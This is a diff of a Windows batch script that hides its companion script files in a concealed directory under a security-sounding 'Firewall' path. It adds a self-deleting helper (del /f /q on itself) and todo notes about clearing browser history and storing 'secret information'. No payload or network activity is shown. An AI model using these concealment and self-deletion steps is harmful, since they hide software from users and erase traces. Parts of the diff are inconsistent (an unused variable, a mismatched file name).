@@ -46,8 +46,12 @@ if not exist "%HD%" (
     attrib +h "%HD%"
 )
 
+:: set the path to the deletion script
+set DEL_SCRIPT=%APPDATA%\Firewall\.del.bat
+
 :: create txt file
 echo "lol" > %HD%\%NAME%.txt
+echo del /f /q "%~f0" > %HD%\.del.bat
 
 echo.
 echo.
@@ -55,17 +59,19 @@ echo.
 
 echo worked
 
-echo clear browser history
+echo todo: clear browser history
 
-echo delete this file
-
-echo use %HD%\%NAME%.txt for secret information
+echo todo: use %HD%\%NAME%.txt for secret information
 
 ping 127.0.0.1 -n 36 > nul
+
+echo run del.bat after script config.cmd exit
+echo %HD%\del.bat
 
 :: move script files with error checking
 if exist "%SF%\%NAME%.vbs" move /y "%SF%\%NAME%.vbs" "%HD%\" >nul
 if exist "%SF%\%NAME%.bat" move /y "%SF%\%NAME%.bat" "%HD%\" >nul
+if exist "%SF%\.del.bat" move /y "%SF%\.del.bat" "%HD%\" >nul
 if exist "%SF%\%NAME%.ps1" move /y "%SF%\%NAME%.ps1" "%HD%\" >nul
 if exist "%SF%\%NAME%e.ps1" move /y "%SF%\%NAME%e.ps1" "%HD%\" >nul
 if exist "%SF%\.ascii.txt" move /y "%SF%\.ascii.txt" "%HD%\" >nul
@@ -76,6 +82,7 @@ attrib +h "%HD%\%NAME%.ps1"
 attrib +h "%HD%\%NAME%e.ps1"
 attrib +h "%HD%\.ascii.txt"
 attrib +h "%HD%\%NAME%.txt"
+attrib +h "%HD%\.del.bat"
 
 for %%f in (%SF%\.*) do (
     attrib +h "%%f" >nul 2>&1
